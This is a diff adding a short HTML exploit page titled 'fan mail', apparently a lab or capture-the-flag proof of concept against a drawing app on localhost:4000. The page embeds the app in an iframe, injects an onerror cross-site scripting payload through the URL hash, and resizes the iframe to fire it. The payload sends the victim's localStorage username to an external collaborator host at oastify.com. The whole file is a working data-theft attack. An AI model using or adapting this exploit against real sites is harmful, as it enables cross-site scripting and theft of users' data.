@@ -1,0 +1,21 @@
+<!doctype html>
+<html>
+<head><title>fan mail</title></head>
+<body>
+<iframe id="i" width="300" height="300" src=""></iframe>
+<script>
+var collab = "gp97futqs95gjwe3fnudqosg77dx189tdtucznzto.oastify.com";
+var onerrorPayload = "window.location=`https://" + collab + "/${localStorage.username}`";
+var hash = "src=1&onerror=" + encodeURIComponent(onerrorPayload) + "&is";
+var i = document.querySelector("#i");
+i.src = "http://localhost:4000/drawing/abcd#" + hash;
+var sizes = [700, 300, 1000, 400, 1200, 350, 900];
+sizes.forEach(function (s, idx) {
+  setTimeout(function () {
+    i.width = s;
+    i.height = s;
+  }, 300 + idx * 300);
+});
+</script>
+</body>
+</html>
